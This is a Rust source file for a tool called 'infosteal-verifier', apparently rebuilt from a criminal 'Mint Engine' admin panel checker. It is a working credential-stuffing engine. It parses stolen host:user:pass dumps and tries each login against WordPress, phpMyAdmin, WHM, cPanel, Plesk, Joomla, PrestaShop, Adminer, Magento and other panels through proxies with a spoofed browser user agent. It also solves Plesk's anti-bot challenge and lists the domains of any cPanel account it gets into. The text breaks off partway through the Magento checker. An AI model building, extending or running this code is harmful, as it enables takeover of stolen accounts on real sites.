//! infosteal-verifier — fast native credential verifier for admin panels / CMS targets.
//!
//! Reconstructed from the behaviour of the "Mint Engine" Admin Panel Checker (PE/CLI,
//! ConfuserEx-packed). The original shipped a license C2 channel (`199.247.29.156:1337`)
//! plus a WMI/SID hardware-fingerprint collector; both are intentionally absent here.
//!
//! Platform-independent engine. HTTP is delegated to `/usr/bin/curl` (present on macOS and
//! most Linux images); the native desktop GUI lives in `macos_gui` (macOS only).

use std::collections::HashMap;
use std::env;
use std::fs::{self, OpenOptions};
use std::io::{BufRead, BufReader, IsTerminal, Read, Write};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

#[cfg(target_os = "macos")]
mod macos_gui;

// ============================================================================
// Types
// ============================================================================

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum CheckStatus {
    /// PanelName, extra info (e.g. discovered cPanel domains)
    Good(String, String),
    /// PanelName
    Bad(String),
    Unknown,
    Invalid,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ProxyType {
    Http,
    Socks4,
    Socks5,
}

impl ProxyType {
    pub fn from_str(s: &str) -> Self {
        match s.trim().to_ascii_lowercase().as_str() {
            "socks4" => ProxyType::Socks4,
            "socks5" => ProxyType::Socks5,
            _ => ProxyType::Http,
        }
    }

    pub fn as_str(&self) -> &'static str {
        match self {
            ProxyType::Http => "Http",
            ProxyType::Socks4 => "Socks4",
            ProxyType::Socks5 => "Socks5",
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct TargetAccount {
    pub raw: String,
    pub url: String,
    pub host: String,
    pub path: String,
    pub origin: String,
    pub username: String,
    pub password: String,
    pub implicit_scheme: bool,
    pub attempts: u32,
}

/// A raw account line plus whether it parsed into a usable target.
#[derive(Clone, Debug)]
pub struct AccountEntry {
    pub raw: String,
    pub valid: bool,
    pub attempts: u32,
}

// ============================================================================
// Parsing helpers
// ============================================================================

/// Index of the colon that terminates a leading URL scheme, if any.
///
/// Only a scheme at the very start of the string counts — a `://` that appears
/// later belongs to the credentials, not to the target.
fn scheme_colon_index(s: &str) -> Option<usize> {
    let idx = s.find("://")?;
    let scheme = &s[..idx];
    if scheme.is_empty() {
        return None;
    }
    if !scheme.chars().next()?.is_ascii_alphabetic() {
        return None;
    }
    if !scheme
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '-' || c == '.')
    {
        return None;
    }
    Some(idx)
}

/// Split a URL-ish target into its authority and path parts.
fn split_host_path(target: &str) -> (String, String) {
    let rest = match scheme_colon_index(target) {
        Some(idx) => &target[idx + 3..],
        None => target,
    };
    match rest.find('/') {
        Some(sl) => (rest[..sl].to_string(), rest[sl..].to_string()),
        None => (rest.to_string(), String::new()),
    }
}

/// Is `target` a usable URL/host target?
///
/// Rejects an empty authority, a non-numeric port and a path that still
/// contains a credential separator.
fn target_is_plausible(target: &str) -> bool {
    if target.is_empty() {
        return false;
    }
    // A target never contains whitespace.
    if target.chars().any(|c| c.is_whitespace()) {
        return false;
    }
    let (authority, path) = split_host_path(target);
    if authority.is_empty() {
        return false;
    }
    if authority.contains(':') {
        // A colon in the authority is a port (or an IPv6 literal). Either way
        // the trailing component must be a plain numeric port.
        let host = &authority[..authority.rfind(':').unwrap_or(0)];
        let port = &authority[authority.rfind(':').unwrap_or(0) + 1..];
        if host.is_empty() || port.is_empty() || !port.chars().all(|c| c.is_ascii_digit()) {
            return false;
        }
    }
    !path.contains(':')
}

/// Split one account line into `(target, username, password)`.
///
/// Accepted layouts (the scheme may be omitted, as it is in most credential
/// dumps):
///
/// ```text
/// host/path:user:pass           target = host/path
/// host:port/path:user:pass      target = host:port/path
/// https://host/path:user:pass
/// https://host/path user:pass   space separated
/// ```
///
/// The credentials are the fields that follow the target; the password keeps
/// any further `:` or spaces it contains.
pub fn split_account_line(s: &str) -> Option<(String, String, String)> {
    let cols: Vec<usize> = s.match_indices(':').map(|(i, _)| i).collect();
    // The colon that terminates the scheme is never a credential separator.
    let scheme_colon = scheme_colon_index(s);

    // Layout A — `target user:pass`. The target may itself carry a port and a
    // path, so it is recognised by shape rather than by colon counting.
    if let Some(sp) = s.find(' ') {
        let head = s[..sp].trim();
        let creds = s[sp + 1..].trim_start_matches([' ', ':']);
        if !head.is_empty() && creds.contains(':') && target_is_plausible(head) {
            let (u, p) = match creds.find(':') {
                Some(c) => (&creds[..c], &creds[c + 1..]),
                None => (creds, ""),
            };
            return Some((head.to_string(), u.trim().to_string(), p.trim().to_string()));
        }
    }

    // Layout B — `target:user:pass`. The target may itself contain colons
    // (a scheme, a port, or a path segment), so pick the longest prefix that
    // still looks like a valid target.
    if cols.len() < 2 {
        return None;
    }
    let mut split_at: Option<usize> = None;
    for &c in cols.iter() {
        if Some(c) == scheme_colon {
            continue;
        }
        let candidate = &s[..c];
        if target_is_plausible(candidate) {
            split_at = Some(c);
        }
    }
    let t = split_at?;
    let rest = &s[t + 1..];
    let (username, password) = match rest.find(':') {
        Some(c) => (&rest[..c], &rest[c + 1..]),
        None => (rest, ""),
    };
    Some((
        s[..t].trim().to_string(),
        username.trim().to_string(),
        password.trim().to_string(),
    ))
}

impl TargetAccount {
    /// Parse one account line into a ready-to-check target.
    ///
    /// A missing scheme defaults to `https://`; `check_account` retries over
    /// `http://` when the implicit-scheme request fails at the transport level.
    pub fn parse(line: &str) -> Option<Self> {
        let s = line.trim();
        if s.is_empty() {
            return None;
        }
        let (target, username, password) = split_account_line(s)?;
        if username.is_empty() && password.is_empty() {
            return None;
        }
        let implicit_scheme = !target.contains("://");
        let url = if implicit_scheme {
            format!("https://{}", target)
        } else {
            target.clone()
        };
        let (origin, host, path) = parse_url_parts(&url)?;
        if host.is_empty() {
            return None;
        }
        Some(TargetAccount {
            raw: s.to_string(),
            url,
            host,
            path,
            origin,
            username,
            password,
            implicit_scheme,
            attempts: 0,
        })
    }
}

pub fn parse_url_parts(url: &str) -> Option<(String, String, String)> {
    let scheme_end = url.find("://")?;
    let scheme = &url[..scheme_end].to_ascii_lowercase();
    if scheme != "http" && scheme != "https" {
        return None;
    }
    let after_scheme = &url[scheme_end + 3..];
    if after_scheme.is_empty() {
        return None;
    }
    let (authority, path) = match after_scheme.find('/') {
        Some(idx) => (&after_scheme[..idx], &after_scheme[idx..]),
        None => (after_scheme, "/"),
    };
    let host = authority
        .split('@')
        .last()
        .unwrap_or(authority)
        .split(':')
        .next()
        .unwrap_or("")
        .to_ascii_lowercase();
    if host.is_empty() {
        return None;
    }
    let origin = format!("{}://{}", scheme, authority);
    let clean_path = path.split('?').next().unwrap_or("/");
    Some((origin, host, clean_path.to_string()))
}

/// Loopback / RFC1918 / mDNS hosts are rejected before any request is made.
pub fn is_local_or_private_host(host: &str) -> bool {
    let h = host.to_ascii_lowercase();
    h == "localhost"
        || h == "127.0.0.1"
        || h.starts_with("192.168.")
        || h.starts_with("10.")
        || h.ends_with(".local")
}

pub fn substr_between<'a>(haystack: &'a str, left: &str, right: &str) -> Option<&'a str> {
    let start = haystack.find(left)? + left.len();
    let end = haystack[start..].find(right)? + start;
    Some(&haystack[start..end])
}

pub fn substrs_between<'a>(haystack: &'a str, left: &str, right: &str) -> Vec<&'a str> {
    let mut out = Vec::new();
    let mut rest = haystack;
    while let Some(s) = rest.find(left) {
        let after_left = &rest[s + left.len()..];
        if let Some(e) = after_left.find(right) {
            out.push(&after_left[..e]);
            rest = &after_left[e + right.len()..];
        } else {
            break;
        }
    }
    out
}

/// Plesk's `wsidchk` challenge is emitted as JSFuck; this decodes it to an integer.
/// `!![]` -> true (1), `+!+[]` -> 1, trailing `+[]` -> trailing zero.
pub fn decode_plesk_jsfuck(expr: &str) -> Option<i64> {
    let mut digits = String::new();
    let bytes = expr.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'(' {
            while i < bytes.len() && bytes[i] == b'(' {
                i += 1;
            }
            let start = i;
            while i < bytes.len() && bytes[i] != b')' {
                i += 1;
            }
            let mut group = &expr[start..i];
            while i < bytes.len() && bytes[i] == b')' {
                i += 1;
            }
            if !group.is_empty() {
                let mut val = 0i32;
                let mut trailing_zero = false;
                if group.ends_with("+[]") {
                    trailing_zero = true;
                    group = &group[..group.len() - 3];
                }
                if group.starts_with("+!+[]") {
                    val += 1;
                    group = &group[5..];
                }
                let mut search_pos = 0;
                while let Some(idx) = group[search_pos..].find("!![]") {
                    val += 1;
                    search_pos += idx + 4;
                }
                digits.push_str(&val.to_string());
                if trailing_zero {
                    digits.push('0');
                }
            }
        } else {
            i += 1;
        }
    }
    digits.parse::<i64>().ok()
}

pub fn url_encode(input: &str) -> String {
    let mut out = String::with_capacity(input.len() * 3);
    for b in input.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            b' ' => out.push('+'),
            _ => out.push_str(&format!("%{:02X}", b)),
        }
    }
    out
}

pub fn encode_form_params(params: &[(&str, &str)]) -> String {
    params
        .iter()
        .map(|(k, v)| format!("{}={}", url_encode(k), url_encode(v)))
        .collect::<Vec<_>>()
        .join("&")
}

pub fn extract_hidden_inputs(html: &str) -> Vec<(String, String)> {
    let mut out = Vec::new();
    let needle = "<input type=\"hidden\" name=\"";
    let mut rest = html;
    while let Some(pos) = rest.find(needle) {
        let after_name = &rest[pos + needle.len()..];
        if let Some(name_end) = after_name.find("\" value=\"") {
            let name = &after_name[..name_end];
            let after_val = &after_name[name_end + 9..];
            if let Some(val_end) = after_val.find('"') {
                let val = &after_val[..val_end];
                out.push((name.to_string(), val.to_string()));
                rest = &after_val[val_end + 1..];
                continue;
            }
        }
        rest = &after_name[1..];
    }
    out
}

// ============================================================================
// HTTP client (curl backend)
// ============================================================================

pub struct HttpResponse {
    pub status: u16,
    pub effective_url: String,
    pub body: String,
    pub cookies: HashMap<String, String>,
}

pub struct HttpClient {
    cookie_jar_path: PathBuf,
    proxy: Option<(ProxyType, String)>,
    user_agent: String,
}

static CLIENT_COUNTER: AtomicU64 = AtomicU64::new(1);

/// Locate the `curl` binary. macOS/Linux keep it in `/usr/bin`; Windows 10+ ships
/// `curl.exe` in System32. Falls back to PATH resolution.
fn curl_binary() -> String {
    const CANDIDATES: &[&str] = &[
        "/usr/bin/curl",
        "/opt/homebrew/bin/curl",
        "/usr/local/bin/curl",
        "/bin/curl",
        r"C:\Windows\System32\curl.exe",
        r"C:\Program Files\curl\curl.exe",
    ];
    for c in CANDIDATES {
        if Path::new(c).is_file() {
            return (*c).to_string();
        }
    }
    "curl".to_string()
}

impl HttpClient {
    pub fn new(proxy: Option<(ProxyType, String)>) -> Self {
        let id = CLIENT_COUNTER.fetch_add(1, Ordering::Relaxed);
        let pid = std::process::id();
        let cookie_jar_path =
            env::temp_dir().join(format!("infosteal_cookies_{}_{}.txt", pid, id));
        HttpClient {
            cookie_jar_path,
            proxy,
            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5384.0 Safari/537.36".to_string(),
        }
    }

    pub fn get(&self, url: &str, headers: &[(&str, &str)]) -> Result<HttpResponse, String> {
        self.request("GET", url, headers, None, None)
    }

    pub fn post_form(
        &self,
        url: &str,
        headers: &[(&str, &str)],
        params: &[(&str, &str)],
    ) -> Result<HttpResponse, String> {
        let body = encode_form_params(params);
        self.request(
            "POST",
            url,
            headers,
            Some(&body),
            Some("application/x-www-form-urlencoded"),
        )
    }

    pub fn post_raw(
        &self,
        url: &str,
        headers: &[(&str, &str)],
        body: &str,
        content_type: &str,
    ) -> Result<HttpResponse, String> {
        self.request("POST", url, headers, Some(body), Some(content_type))
    }

    fn request(
        &self,
        method: &str,
        url: &str,
        headers: &[(&str, &str)],
        body: Option<&str>,
        content_type: Option<&str>,
    ) -> Result<HttpResponse, String> {
        let marker = "__ISV_CURL_META__:";
        let mut cmd = Command::new(curl_binary());
        cmd.arg("-sS")
            .arg("-k")
            .arg("-L")
            .arg("--max-redirs")
            .arg("5")
            .arg("--connect-timeout")
            .arg("10")
            .arg("--max-time")
            .arg("20")
            .arg("--compressed")
            .arg("-A")
            .arg(&self.user_agent)
            .arg("-b")
            .arg(&self.cookie_jar_path)
            .arg("-c")
            .arg(&self.cookie_jar_path)
            .arg("-X")
            .arg(method);

        if let Some((ptype, ref paddr)) = self.proxy {
            let p = paddr.trim();
            if !p.is_empty() {
                // host:port or host:port:user:pass
                let parts: Vec<&str> = p.split(':').collect();
                let proxy_arg = if parts.len() >= 4 {
                    format!("{}:{}@{}:{}", parts[2], parts[3], parts[0], parts[1])
                } else {
                    p.to_string()
                };
                match ptype {
                    ProxyType::Http => {
                        cmd.arg("-x").arg(format!("http://{}", proxy_arg));
                    }
                    ProxyType::Socks4 => {
                        cmd.arg("--socks4a").arg(proxy_arg);
                    }
                    ProxyType::Socks5 => {
                        cmd.arg("--socks5-hostname").arg(proxy_arg);
                    }
                }
            }
        }

        if let Some(ct) = content_type {
            cmd.arg("-H").arg(format!("Content-Type: {}", ct));
        }
        for (k, v) in headers {
            cmd.arg("-H").arg(format!("{}: {}", k, v));
        }
        if let Some(b) = body {
            cmd.arg("--data-raw").arg(b);
        }

        cmd.arg("-w")
            .arg(format!("\n{}%{{http_code}}\t%{{url_effective}}", marker))
            .arg(url);

        let output = cmd.output().map_err(|e| format!("curl launch error: {}", e))?;
        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(format!("Network error: {}", stderr.trim()));
        }

        let stdout = String::from_utf8_lossy(&output.stdout);
        let meta_pos = stdout
            .rfind(marker)
            .ok_or_else(|| "Missing curl metadata".to_string())?;
        let resp_body = stdout[..meta_pos].trim_end_matches('\n').to_string();
        let meta_str = &stdout[meta_pos + marker.len()..];
        let mut meta_parts = meta_str.trim().splitn(2, '\t');
        let status: u16 = meta_parts.next().unwrap_or("0").parse().unwrap_or(0);
        let effective_url = meta_parts.next().unwrap_or(url).to_string();

        let cookies = self.read_cookies();
        Ok(HttpResponse {
            status,
            effective_url,
            body: resp_body,
            cookies,
        })
    }

    fn read_cookies(&self) -> HashMap<String, String> {
        let mut map = HashMap::new();
        if let Ok(content) = fs::read_to_string(&self.cookie_jar_path) {
            for raw_line in content.lines() {
                let line = raw_line.trim();
                let clean = line.strip_prefix("#HttpOnly_").unwrap_or(line);
                if clean.is_empty() || clean.starts_with('#') {
                    continue;
                }
                let cols: Vec<&str> = clean.split('\t').collect();
                if cols.len() >= 7 {
                    map.insert(cols[5].to_string(), cols[6].to_string());
                }
            }
        }
        map
    }
}

impl Drop for HttpClient {
    fn drop(&mut self) {
        let _ = fs::remove_file(&self.cookie_jar_path);
    }
}

// ============================================================================
// Panel checkers
// ============================================================================

pub fn check_account(
    target: &TargetAccount,
    proxy: Option<(ProxyType, String)>,
) -> Result<CheckStatus, String> {
    if target.username.len() > 32
        || target.password.len() > 32
        || is_local_or_private_host(&target.host)
    {
        return Ok(CheckStatus::Invalid);
    }

    let client = HttpClient::new(proxy);
    let init_headers = [
        (
            "Accept",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        ),
        ("Accept-Language", "en"),
    ];
    let resp = match client.get(&target.url, &init_headers) {
        Ok(r) => r,
        Err(e) => {
            // A target without an explicit scheme is tried over https first.
            // Many admin panels still only serve plain http, so retry there
            // before the attempt is counted as a network failure.
            if target.implicit_scheme && target.url.starts_with("https://") {
                let alt = format!("http://{}", &target.url["https://".len()..]);
                match client.get(&alt, &init_headers) {
                    Ok(r) => r,
                    Err(_) => return Err(e),
                }
            } else {
                return Err(e);
            }
        }
    };
    if resp.status == 401 {
        return Ok(CheckStatus::Unknown);
    }
    if resp.status != 200 {
        return Err("Cant load page".to_string());
    }

    let html = &resp.body;
    let eff_url = &resp.effective_url;
    let (eff_origin, eff_host, eff_path) = parse_url_parts(eff_url)
        .unwrap_or_else(|| (target.origin.clone(), target.host.clone(), target.path.clone()));

    if html.contains("Powered by WordPress") {
        check_wordpress(&client, target, html, eff_url, &eff_origin, &eff_host)
    } else if html.contains("<title>phpMyAdmin") {
        check_phpmyadmin(&client, target, html, eff_url, &eff_origin, &eff_path)
    } else if html.contains("<title>WHM Login</title>") {
        check_whm(&client, target, eff_url, &eff_origin)
    } else if html.contains("PrestaShop") {
        check_prestashop(&client, target, html, eff_url, &eff_origin)
    } else if html.contains("<title>One moment, please...</title>") || html.contains("<title>Plesk")
    {
        check_plesk(&client, target, html, eff_url, &eff_origin)
    } else if html.contains("<title>Login - Adminer</title>") {
        check_adminer(&client, target, eff_url, &eff_origin)
    } else if html.contains("Joomla is free software released under the GNU General Public License")
    {
        check_joomla(&client, target, html, eff_url, &eff_origin)
    } else if html.contains("cPanel_magic_revision") {
        check_cpanel(&client, target, html, eff_url, &eff_origin)
    } else if html.contains("<input name=\"form_key\"")
        && html.contains("name=\"login[username]\"")
        && html.contains("name=\"login[password]\"")
    {
        check_magento(&client, target, html, eff_url)
    } else if html.contains("Atlassian Confluence") {
        check_confluence(&client, target, html, eff_url, &eff_origin)
    } else if html.contains("Atlassian Jira") || html.contains("Atlassian JIRA") {
        check_jira(&client, target, eff_url, &eff_origin)
    } else if target.path.contains("/RDWeb/")
        && html.contains("<form id=\"FrmLogin\" name=\"FrmLogin\"")
    {
        check_rdweb(&client, target, html, eff_url, &eff_origin)
    } else if html.contains("<div class='syno-no-script'>")
        || target.host.contains(".quickconnect.to")
        || html.contains("<title>Connecting...</title>")
    {
        check_synology(&client, target, html, eff_url, &eff_origin, &eff_host)
    } else if html.contains("ownCloud") && html.contains("<body id=\"body-login\"") {
        check_owncloud(&client, target, html, eff_url)
    } else {
        Ok(CheckStatus::Unknown)
    }
}

fn check_wordpress(
    client: &HttpClient,
    target: &TargetAccount,
    html: &str,
    eff_url: &str,
    eff_origin: &str,
    eff_host: &str,
) -> Result<CheckStatus, String> {
    let action = substr_between(
        html,
        "<form name=\"loginform\" id=\"loginform\" action=\"",
        "\"",
    )
    .ok_or_else(|| "Can't find wp loginform".to_string())?;
    let post_url = if action.starts_with("http") {
        action.to_string()
    } else {
        format!("{}/{}", eff_origin, action.trim_start_matches('/'))
    };
    let redirect_to = substr_between(
        html,
        "<input type=\"hidden\" name=\"redirect_to\" value=\"",
        "\"",
    )
    .map(|s| s.to_string())
    .unwrap_or_else(|| format!("https://{}/wp-admin/", eff_host));

    let headers = [
        ("Cache-Control", "max-age=0"),
        ("Origin", eff_origin),
        ("Referer", eff_url),
        ("Accept-Language", "en"),
    ];
    let params = [
        ("log", target.username.as_str()),
        ("pwd", target.password.as_str()),
        ("wp-submit", "Log In"),
        ("redirect_to", redirect_to.as_str()),
        ("testcookie", "1"),
    ];
    let resp = client.post_form(&post_url, &headers, &params)?;
    if resp
        .body
        .contains("The password you entered for the username")
        || resp.body.contains("is not registered on this site")
    {
        return Ok(CheckStatus::Bad("WordPress".to_string()));
    }
    if resp
        .cookies
        .keys()
        .any(|k| k.contains("wordpress_logged_in"))
        || resp.body.contains("Administration email verification")
    {
        return Ok(CheckStatus::Good("WordPress".to_string(), String::new()));
    }
    Err(format!("Unknown response: {}", resp.effective_url))
}

fn check_phpmyadmin(
    client: &HttpClient,
    target: &TargetAccount,
    html: &str,
    eff_url: &str,
    eff_origin: &str,
    eff_path: &str,
) -> Result<CheckStatus, String> {
    let token = substr_between(html, "input type=\"hidden\" name=\"token\" value=\"", "\"")
        .ok_or_else(|| "Can't find token".to_string())?;
    let set_session = substr_between(
        html,
        "input type=\"hidden\" name=\"set_session\" value=\"",
        "\"",
    )
    .unwrap_or("");
    let post_path = if eff_path.ends_with("/index.php") {
        eff_path.to_string()
    } else {
        format!("{}/index.php", eff_path.trim_end_matches('/'))
    };
    let post_url = format!("{}{}", eff_origin, post_path);
    let headers = [
        ("Cache-Control", "max-age=0"),
        ("Origin", eff_origin),
        ("Referer", eff_url),
        ("Accept-Language", "en"),
    ];
    let mut params = vec![
        ("pma_username", target.username.as_str()),
        ("pma_password", target.password.as_str()),
        ("server", "1"),
        ("lang", "en"),
        ("collation_connection", "utf8_unicode_ci"),
        ("token", token),
    ];
    if !set_session.is_empty() {
        params.push(("set_session", set_session));
    }
    let resp = client.post_form(&post_url, &headers, &params)?;
    if resp.body.contains("Cannot log in to the MySQL server")
        || resp.body.contains("Access denied for user")
    {
        return Ok(CheckStatus::Bad("phpMyAdmin".to_string()));
    }
    if resp.cookies.keys().any(|k| k.contains("pmaAuth"))
        || resp.body.contains("phpMyAdmin is more friendly with a")
    {
        return Ok(CheckStatus::Good("phpMyAdmin".to_string(), String::new()));
    }
    Err(format!("Unknown response: {}", resp.effective_url))
}

fn check_whm(
    client: &HttpClient,
    target: &TargetAccount,
    eff_url: &str,
    eff_origin: &str,
) -> Result<CheckStatus, String> {
    let post_url = format!("{}/login?login_only=1", eff_origin);
    let headers = [
        ("Accept", "*/*"),
        ("Origin", eff_origin),
        ("Referer", eff_url),
    ];
    let params = [
        ("user", target.username.as_str()),
        ("pass", target.password.as_str()),
        ("goto_uri", "/"),
    ];
    let resp = client.post_form(&post_url, &headers, &params)?;
    if !resp.body.trim_start().starts_with('{') {
        return Err("Bad response".to_string());
    }
    if resp.body.contains("status\":1") {
        return Ok(CheckStatus::Good("WHM".to_string(), String::new()));
    }
    if resp.body.contains("status\":0") {
        return Ok(CheckStatus::Bad("WHM".to_string()));
    }
    Err(format!("Unknown response: {}", resp.effective_url))
}

fn check_cpanel(
    client: &HttpClient,
    target: &TargetAccount,
    html: &str,
    eff_url: &str,
    eff_origin: &str,
) -> Result<CheckStatus, String> {
    let action =
        substr_between(html, "<form novalidate id=\"login_form\" action=\"", "\"").unwrap_or("/login/");
    let clean_action = action.split('?').next().unwrap_or("/login/");
    let post_url = format!(
        "{}/{}?login_only=1",
        eff_origin,
        clean_action.trim_start_matches('/')
    );
    let headers = [
        ("Accept", "*/*"),
        ("Origin", eff_origin),
        ("Referer", eff_url),
        ("Accept-Language", "en"),
    ];
    let params = [
        ("user", target.username.as_str()),
        ("pass", target.password.as_str()),
        ("goto_uri", "/"),
    ];
    let resp = client.post_form(&post_url, &headers, &params)?;
    if !resp.body.trim_start().starts_with('{') {
        return Err("Bad json".to_string());
    }
    if resp.body.contains("status\":0")
        || resp
            .body
            .contains("You do not have permission to access this page")
    {
        return Ok(CheckStatus::Bad("cPanel".to_string()));
    }
    if resp.body.contains("status\":1") {
        let mut extra = String::new();
        if let Some(sec_tok) = substr_between(&resp.body, "security_token\":\"", "\"") {
            let dom_url = format!(
                "{}/{}/execute/DomainInfo/domains_data",
                eff_origin,
                sec_tok.trim_matches('/')
            );
            let dom_headers = [
                ("Accept", "*/*"),
                ("X-Requested-With", "XMLHttpRequest"),
                ("Origin", eff_origin),
                ("Referer", eff_url),
                ("Accept-Language", "en-US,en;q=0.9"),
            ];
            if let Ok(dom_resp) = client.post_form(
                &dom_url,
                &dom_headers,
                &[("return_https_redirect_status", "1")],
            ) {
                let mut domains = substrs_between(&dom_resp.body, "domain\":\"", "\"");
                domains.sort_unstable();
                domains.dedup();
                if !domains.is_empty() {
                    extra = format!(" | Domains: {} | {}", domains.len(), domains.join(" | "));
                }
            }
        }
        return Ok(CheckStatus::Good("cPanel".to_string(), extra));
    }
    Err(format!("Unknown response: {}", resp.effective_url))
}

fn check_plesk(
    client: &HttpClient,
    target: &TargetAccount,
    initial_html: &str,
    eff_url: &str,
    eff_origin: &str,
) -> Result<CheckStatus, String> {
    let mut html = initial_html.to_string();
    let mut current_url = eff_url.to_string();

    if html.contains("<title>One moment, please...</title>") {
        let west_expr = substr_between(&html, "var west=", ",").unwrap_or("");
        let east_expr = substr_between(&html, "east=", ",").unwrap_or("");
        let west = decode_plesk_jsfuck(west_expr).unwrap_or(0);
        let east = decode_plesk_jsfuck(east_expr).unwrap_or(0);
        let base = current_url.split('?').next().unwrap_or(&current_url);
        let chk_url = format!("{}?wsidchk={}", base, west + east);
        let resp = client.get(&chk_url, &[("Accept-Language", "en")])?;
        html = resp.body;
        current_url = resp.effective_url;
    }

    let token = substr_between(&html, "id=\"forgery_protection_token\" content=\"", "\"")
        .ok_or_else(|| "Can't find forgery_protection_token".to_string())?;
    let action = substr_between(&html, "action=\"", "\"").unwrap_or("/login_up.php");
    let post_url = if action.starts_with("http") {
        action.to_string()
    } else {
        format!("{}/{}", eff_origin, action.trim_start_matches('/'))
    };
    let headers = [
        (
            "Accept",
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        ),
        ("Referer", current_url.as_str()),
        ("Accept-Language", "en"),
    ];
    let params = [
        ("login_name", target.username.as_str()),
        ("passwd", target.password.as_str()),
        ("locale_id", "default"),
        ("forgery_protection_token", token),
        ("success_redirect_url", ""),
    ];
    let resp = client.post_form(&post_url, &headers, &params)?;
    if resp.body.contains("status\":\"error") || resp.effective_url.ends_with("login_up.php") {
        return Ok(CheckStatus::Bad("Plesk".to_string()));
    }
    let title = substr_between(&resp.body, "<title>", "</title>").unwrap_or("");
    if title.contains("Plesk") && resp.cookies.contains_key("PLESKSESSID") {
        return Ok(CheckStatus::Good("Plesk".to_string(), String::new()));
    }
    Err(format!("Unknown response: {}", resp.effective_url))
}

fn check_prestashop(
    client: &HttpClient,
    target: &TargetAccount,
    html: &str,
    eff_url: &str,
    eff_origin: &str,
) -> Result<CheckStatus, String> {
    let redirect =
        substr_between(html, "name=\"redirect\" id=\"redirect\" value=\"", "\"").unwrap_or("");
    let post_url = eff_url.split('?').next().unwrap_or(eff_url);
    let headers = [
        ("Accept", "application/json, text/javascript, */*; q=0.01"),
        ("cache-control", "no-cache"),
        ("X-Requested-With", "XMLHttpRequest"),
        ("Origin", eff_origin),
        ("Referer", eff_url),
        ("Accept-Language", "en"),
    ];
    let params = [
        ("ajax", "1"),
        ("token", ""),
        ("controller", "AdminLogin"),
        ("submitLogin", "1"),
        ("passwd", target.password.as_str()),
        ("email", target.username.as_str()),
        ("redirect", redirect),
    ];
    let resp = client.post_form(post_url, &headers, &params)?;
    if resp.body.contains("hasErrors\":true") {
        return Ok(CheckStatus::Bad("PrestaShop".to_string()));
    }
    if resp.body.contains("hasErrors\":false") {
        return Ok(CheckStatus::Good("PrestaShop".to_string(), String::new()));
    }
    Err(format!("Unknown response: {}", resp.effective_url))
}

fn check_adminer(
    client: &HttpClient,
    target: &TargetAccount,
    eff_url: &str,
    eff_origin: &str,
) -> Result<CheckStatus, String> {
    let post_url = eff_url.split('?').next().unwrap_or(eff_url);
    let headers = [
        ("Cache-Control", "max-age=0"),
        ("Origin", eff_origin),
        ("Referer", eff_url),
        ("Accept-Language", "en"),
    ];
    let params = [
        ("auth[driver]", "server"),
        ("auth[server]", ""),
        ("auth[username]", target.username.as_str()),
        ("auth[password]", target.password.as_str()),
        ("auth[db]", ""),
    ];
    let resp = client.post_form(post_url, &headers, &params)?;
    if resp
        .body
        .contains("<div class='error'>Access denied for user")
    {
        return Ok(CheckStatus::Bad("Adminer".to_string()));
    }
    if resp.body.contains("<p>Logged as") {
        return Ok(CheckStatus::Good("Adminer".to_string(), String::new()));
    }
    Err(format!("Unknown response: {}", resp.effective_url))
}

fn check_joomla(
    client: &HttpClient,
    target: &TargetAccount,
    html: &str,
    eff_url: &str,
    eff_origin: &str,
) -> Result<CheckStatus, String> {
    let action = substr_between(html, "<form action=\"", "\"").unwrap_or("/administrator/index.php");
    let post_url = if action.starts_with("http") {
        action.to_string()
    } else {
        format!("{}/{}", eff_origin, action.trim_start_matches('/'))
    };
    let hidden = extract_hidden_inputs(html);
    let ret_val = hidden
        .iter()
        .find(|(k, _)| k == "return")
        .map(|(_, v)| v.clone())
        .unwrap_or_default();
    let csrf_pair = hidden.into_iter().last();

    let mut params: Vec<(&str, &str)> = vec![
        ("username", target.username.as_str()),
        ("passwd", target.password.as_str()),
        ("option", "com_login"),
        ("task", "login"),
        ("return", ret_val.as_str()),
    ];
    let (csrf_k, csrf_v);
    if let Some((k, v)) = csrf_pair {
        csrf_k = k;
        csrf_v = v;
        if csrf_k != "return" && csrf_k != "option" && csrf_k != "task" {
            params.push((csrf_k.as_str(), csrf_v.as_str()));
        }
    }

    let headers = [
        ("Cache-Control", "max-age=0"),
        ("Origin", eff_origin),
        ("Referer", eff_url),
        ("Accept-Language", "en"),
    ];
    let resp = client.post_form(&post_url, &headers, &params)?;
    if resp
        .body
        .contains("The webmaster has forbidden your access to this site")
    {
        return Err("Access forbidden".to_string());
    }
    if resp.body.contains("Username and password do not match") {
        return Ok(CheckStatus::Bad("Joomla".to_string()));
    }
    if resp.body.contains("<title>Control Panel") {
        return Ok(CheckStatus::Good("Joomla".to_string(), String::new()));
    }
    Err(format!("Unknown response: {}", resp.effective_url))
}

fn check_magento(
    client: &HttpClient,
    target: &TargetAccount,
    html: &str,
    eff_url: &str,
) -> Result<CheckStatus, String> {
    let form_key = substr_between(
        html,
        "<input name=\"form_key\" type=\"hidden\" value=\"",
        "\"",
    )
    .ok_or_else(|| "Can't find form key".to_string())?;
    let params = [
        ("form_key", form_key),
        ("login[username]", target.username.as_str()),
        ("login[password]", target.password.as_str()),
    ];
    let resp = client.post_form(eff_url, &[], &params)?;
    if resp.body.contains("<li class=\"error-msg\">")
        || resp.body.contains("class=\"action-forgotpassword\"")
        || resp.body.contains("<label for=\"captcha\"")
    {
        return Ok(CheckStatus::Bad("Magento".to_string()));
    }
    if resp.body.contains("class=\"account-signout\"")
        || resp.body.contains("class=\"link-logout\"")
        || resp.body.contains("class=\"access-denied-page\"")
    {
